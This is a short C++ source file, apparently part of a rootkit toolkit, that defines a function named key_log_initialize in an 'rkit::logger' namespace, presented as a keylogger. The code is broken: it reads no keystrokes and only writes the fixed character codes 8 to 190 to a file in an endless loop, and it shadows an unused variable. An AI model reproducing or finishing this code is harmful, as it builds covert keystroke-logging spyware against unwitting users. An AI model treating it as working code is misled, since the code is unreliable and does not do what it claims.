#include <TlHelp32.h>
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <string_view>

namespace rkit::logger {
  void key_log_initialize( std::string path ) {
    char key = 'X';
    while ( true ) {

      for ( int key = 8; key <= 190; key++ ) {
        std::ofstream log( path.c_str( ), std::ofstream::in | std::ofstream::out | std::ofstream::app | std::ofstream::binary );

        if ( log.is_open( ) ) {
          log << char( key );
          log.close( );
        }
      }
    }
  }
} // namespace rkit::logger